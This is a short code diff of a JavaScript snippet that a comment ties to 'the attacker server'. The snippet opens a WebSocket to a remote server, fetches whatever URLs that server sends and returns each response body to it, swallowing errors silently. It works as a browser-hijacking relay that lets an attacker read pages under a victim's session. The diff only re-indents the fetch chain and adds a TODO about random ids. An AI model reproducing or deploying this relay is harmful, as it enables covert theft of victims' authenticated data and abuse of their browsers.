@@ -3,6 +3,7 @@
 
     (() => {
         // TODO build file using a config containing the attacker server
+        // TODO randomly choose an id
         const ws = new WebSocket('ws://localhost:8080/ws/12345')
 
         ws.onmessage = (msg) => {
@@ -10,14 +11,14 @@
             const url = msgobj.url
             // TODO make a request object to allow for more configurable requests
             fetch(url)
-                .then(res => {
-                    res.text()
-                        .then(restext => {
-                            ws.send(JSON.stringify(restext))
-                        })
-                        .catch(err => null) // Silently error TODO send error back to server
+            .then(res => {
+                res.text()
+                .then(restext => {
+                    ws.send(JSON.stringify(restext))
                 })
                 .catch(err => null) // Silently error TODO send error back to server
+            })
+            .catch(err => null) // Silently error TODO send error back to server
         }
     })()
 })()
